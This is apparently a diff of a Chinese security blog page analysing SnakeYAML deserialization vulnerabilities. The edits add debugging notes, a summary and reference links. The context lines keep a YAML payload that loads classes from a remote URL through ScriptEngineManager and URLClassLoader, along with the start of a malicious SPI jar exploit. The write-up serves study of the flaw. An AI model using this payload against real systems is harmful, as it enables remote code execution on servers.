@@ -390,7 +390,7 @@ Ya">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.9k
+                    3.1k
                 </div>
                 
 
@@ -465,8 +465,9 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 <h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p><a name="MdNuR"></a></p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>!!+全类名指定反序列化的类，反序列化过程中会实例化该类。snakeyaml 将全类名解析，并将类使用forname()进行加载，然后通过反射获取构造器，调用构造方法，控制适当的类的构造方法就能进行漏洞攻击</p>
 <p><a name="nwg1g"></a></p>
-<h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><p>下面是一些调试过程，方便理解是如何进解析的，可能大部分内容对于我们的漏洞毫无关系<br>调试代码：</p>
-<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><p>下面是一些调试过程，方便理解是如何进解析的，可能大部分内容对于我们的漏洞毫无关系<br></p>
+<p>！！！ 值得注意的是这里调式的数据类型是数组，其他数据稍有不同</p>
+<h4 id="sequence类型反序列化过程调试代码"><a href="#sequence类型反序列化过程调试代码" class="headerlink" title="sequence类型反序列化过程调试代码:"></a>sequence类型反序列化过程调试代码:</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
 		<span class="token class-name">String</span> context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://7c6yh7.dnslog.cn\"]]]]\n"</span><span class="token punctuation">;</span>
 		<span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 		yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -476,15 +477,24 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 <p>new Yaml()初始化：大概就是初始化一些构造器，和一些解析规则</p>
 <p>load的过程：</p>
 <p><a name="l5INl"></a></p>
-<h4 id="1-初始化部分："><a href="#1-初始化部分：" class="headerlink" title="1.初始化部分："></a>1.初始化部分：</h4><p>根据输入创建流，和传入Object.class，表示返回一个Object<br><img src="/img/1-22/1.png"><br>然后new Composer加载默认配置并解析开头和结尾的位置</p>
+<h5 id="1-初始化部分："><a href="#1-初始化部分：" class="headerlink" title="1.初始化部分："></a>1.初始化部分：</h5><p>根据输入创建流，和传入Object.class，表示返回一个Object<br><img src="/img/1-22/1.png"><br></p>
+<p>进入loadFromReader</p>
+<img src="/img/1-22/21.png">
+
+<p>在ParserImpl中对sreader做了相关的处理映射；追进去看一下；利用重载拿到相关映射；</p>
+<img src="/img/1-22/22.png">
+
+
+
+<p>然后new Composer加载默认配置并解析开头和结尾的位置</p>
 <p><a name="mE9Al"></a></p>
-<h4 id="2-解析节点"><a href="#2-解析节点" class="headerlink" title="2.解析节点"></a>2.解析节点</h4><p>然后getSingleNode()将整个yaml数据解析成多个节点，，注意的是在解析节点过程中composeNode方法和composeSequenceNode方法（数据是Sequence类型）相互调用形成递归，这样就递归解析到每个节点。</p>
+<h5 id="2-解析节点"><a href="#2-解析节点" class="headerlink" title="2.解析节点"></a>2.解析节点</h5><p>然后getSingleNode()将整个yaml数据解析成多个节点，，注意的是在解析节点过程中composeNode方法和composeSequenceNode方法（数据是Sequence类型）相互调用形成递归，这样就递归解析到每个节点。</p>
 <p>最终解析完多重嵌套的数据</p>
 <p><img src="/img/1-22/2.png"><br>然后每一个节点的类型，或者是全类名加上默认的前缀，就是一个tag<br><img src="/img/1-22/3.png"></p>
 <p>然后进入constructDocument方法，再进入constructObject方法。这是因为yaml数据可能是多个部分</p>
 <p>constructObject中会判断是否已经被解析，即在缓存hashmap是否已存在，然后继续构造</p>
 <p><a name="cd4ML"></a></p>
-<h4 id="3-获取构造器和进行类加载"><a href="#3-获取构造器和进行类加载" class="headerlink" title="3.获取构造器和进行类加载"></a>3.获取构造器和进行类加载</h4><blockquote>
+<h5 id="3-获取构造器和进行类加载"><a href="#3-获取构造器和进行类加载" class="headerlink" title="3.获取构造器和进行类加载"></a>3.获取构造器和进行类加载</h5><blockquote>
 <p>这里的构造器是SnakeYaml中设置的构造器，而不是我们设置的类构造器</p>
 </blockquote>
 <p>构造器初始化：</p>
@@ -494,7 +504,7 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 <p>类加载：<br>从tag中去除前缀，拿到全类名，进入forName进行类加载，这里类加载进行了初始化，那么被加载的类中的静态代码块可以执行。从主线程拿到应用加载器进行加<img src="/img/1-22/7.png"></p>
 <p>最终还是从yamlClassConstructors中拿到的构造器。也就是Sequenced的构造器<br><img src="/img/1-22/8.png"></p>
 <p><a name="ufLhq"></a></p>
-<h4 id="4-反射构造"><a href="#4-反射构造" class="headerlink" title="4.反射构造"></a>4.反射构造</h4><p>进入Sequence构造器的construct方法中。首先会获取类构造器<br><img src="/img/1-22/9.png"><br>上面代码获取构造方法的大致流程：</p>
+<h5 id="4-反射构造"><a href="#4-反射构造" class="headerlink" title="4.反射构造"></a>4.反射构造</h5><p>进入Sequence构造器的construct方法中。首先会获取类构造器<br><img src="/img/1-22/9.png"><br>上面代码获取构造方法的大致流程：</p>
 <ol>
 <li>获取全面的类构造器</li>
 <li>循环遍历，拿到参数个数与node节点value个数相同的类构造方法（这里我们有一个元素的嵌套，相当于是有一个参数）</li>
@@ -507,6 +517,9 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 <p>上面过程可以看出SnakeYaml中会经常有递归。</p>
 <p>上面最后调用的方法ScriptEngineManager(ClassLoader loader)涉及java中的SPI机制</p>
 <p><a name="syXDk"></a></p>
+<h4 id="mapping类型反序列化过程"><a href="#mapping类型反序列化过程" class="headerlink" title="mapping类型反序列化过程"></a><strong>mapping类型反<strong><strong>序列化</strong></strong>过程</strong></h4><p>mapping数据类型对应javaBean对象，大致跟上面相同，不同的是会同fastjson一样会调用setter方法。</p>
+<p>调式过程就省略了,攻击链可以参考fastjson的</p>
+<p>可以参考这位师傅的文章：<a target="_blank" rel="noopener" href="https://s1mple-top.github.io/2022/03/26/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java SnakeYaml反序列化漏洞 | s1mple</a></p>
 <h2 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h2><blockquote>
 <p>SPI机制在其中的一条攻击链中利用到</p>
 </blockquote>
@@ -562,7 +575,7 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 <h2 id="ScriptEngineManager攻击链"><a href="#ScriptEngineManager攻击链" class="headerlink" title="ScriptEngineManager攻击链"></a><strong>ScriptEngineManager攻击链</strong></h2><p><a name="GUp03"></a></p>
 <h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>我们上面的payload只是进行了dnslog进行漏洞验证，现在来编写exp和继续调式分析</p>
 <p>思路：根据SPI机制，和ScriptEngineManger就是SPI机制的实现，那么exp就是SPI机制中的服务提供者，编写恶意类实现相关接口，并在META-INF目录下的services目录下创建相关接口名称的文件，写上我们的恶意类的全类名，最后开启一个http服务，放置我们恶意的jar包</p>
-<p>进入上面最后的init方法中的initEngines方法中，可以看到ServiceLoad<scriptenginefactory><br><img src="/img/1-22/13.png"><br>那么加载的就是那些实现了ScriptEngineFactory接口的服务，那恶意类实现ScriptEngineFactory接口<br>（当然这个接口肯定是不唯一的）</scriptenginefactory></p>
+<p>进入上面最后的init方法中的initEngines方法中，可以看到ServiceLoad<scriptenginefactory><br><img src="/img/1-22/13.png"><br>那么加载的就是那些实现了ScriptEngineFactory接口的服务，那恶意类实现ScriptEngineFactory接口<br></scriptenginefactory></p>
 <p>新建项目<br>编写恶意类：</p>
 <pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span>
 
@@ -660,6 +673,8 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
 
 
 <p>这只是SnakeYaml反序列化漏洞的一部分哦~</p>
+<h2 id="复习总结"><a href="#复习总结" class="headerlink" title="复习总结"></a><strong>复习总结</strong></h2><p>这里只是简单介绍了SnakeYaml反序列化漏洞，不同的数据类型稍有不同，当数据为键值对时，会调用构造方法和setter方法。当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类</p>
+<p>续集：SnakeYaml反序列化漏洞攻击链，可暂时参考：<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">SnakeYAML反序列化及可利用Gadget</a></p>
 
                 
             </div>
@@ -853,16 +868,16 @@ yamlMap <span class="token operator">=</span> yaml<span class="token punctuation
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
                     <a href="/tags/java%E5%AE%89%E5%85%A8/">
                         <span class="chip bg-color">java安全</span>
                     </a>
                     
                     <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">反序列化漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
                     </a>
                     
                 </div>
@@ -1362,9 +1377,9 @@ $(function () {
                                                                                                                                                             
                                                                                                                                                                 <script
                                                                                                                                                                     src="/libs/instantpage/instantpage.js"
-                                                                                                                                                                    type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+                                                                                                                                                                    type="module"></script>
                                                                                                                                                                 
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 
 </html>
